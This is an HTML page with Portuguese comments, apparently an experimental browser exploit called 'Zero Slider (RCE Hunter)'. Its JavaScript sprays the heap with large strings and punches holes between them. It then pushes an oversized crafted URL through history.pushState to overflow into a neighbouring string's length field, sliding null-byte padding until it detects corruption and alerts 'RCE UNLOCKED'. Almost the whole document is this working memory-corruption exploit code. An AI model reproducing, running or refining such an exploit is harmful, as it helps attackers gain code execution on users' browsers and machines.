<!DOCTYPE html>
<html>
<head>
    <title>Zero Slider (RCE Hunter)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .hit { color: yellow; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Zero Slider: Escorregando para o Length</h1>
    <p>Usando Zeros para alinhar o ataque de 0x01 no cabeçalho.</p>

    <button onclick="startZeroSlider()">INICIAR SLIDER AUTOMÁTICO</button>
    <button onclick="stop()" style="color:red; border-color:red">PARAR</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // Começamos bem recuados para garantir que cobrimos a área do Header
        const START_OFFSET = 709480; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Vítima Vencedora: 1MB TextDecoder
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];
        var isRunning = false;

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stop() { isRunning = false; log("Parando..."); }

        async function startZeroSlider() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando Slider de Zeros...");

            // Vamos testar de 0 a 64 bytes de zeros
            for (let zeros = 0; zeros <= 64; zeros++) {
                if(!isRunning) break;

                log(`--- TESTANDO: ${zeros} ZEROS de Padding ---`);

                // 1. Limpeza
                victims = [];
                await forceGC();

                try {
                    // 2. SPRAY
                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                    rawBuffer.fill(0x42); 
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    for(let i=0; i<80; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 3. Buracos
                    for(let i=0; i<80; i+=2) victims[i] = null;
                    await forceGC();

                    // 4. EXPLOIT COM SLIDER
                    setTimeout(() => {
                        try {
                            // A: Base Recuada
                            let buffer = "A".repeat(START_OFFSET);
                            
                            // B: O Slider (Zeros variáveis)
                            // Isso empurra o início dos 0x01 para frente pixel a pixel
                            buffer += "\u0000".repeat(zeros);
                            
                            // C: O Ataque
                            buffer += "\x01".repeat(OVERFLOW_AMT);
                            
                            history.pushState({}, "slider_" + zeros, "/" + buffer);

                            checkVictims(PAYLOAD_SIZE, zeros);

                        } catch (e) {
                            log("Erro: " + e.message);
                        }
                    }, 500);

                    // Pausa maior para estabilidade
                    await new Promise(r => setTimeout(r, 800));

                } catch(e) {
                    log("Erro memória: " + e.message);
                }
            }
            log("Fim do Slider.");
        }

        function checkVictims(expectedLen, zCount) {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (Length)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com ${zCount} Zeros!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        isRunning = false;
                        return;
                    }

                    // SINAL (Dados)
                    if (msg.charCodeAt(0) === 1) {
                         log(`[SINAL] ${zCount} Zeros: Pegou DADOS. O 0x01 ainda está muito longe?`, 'hit');
                         return;
                    }
                } catch(e) {}
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
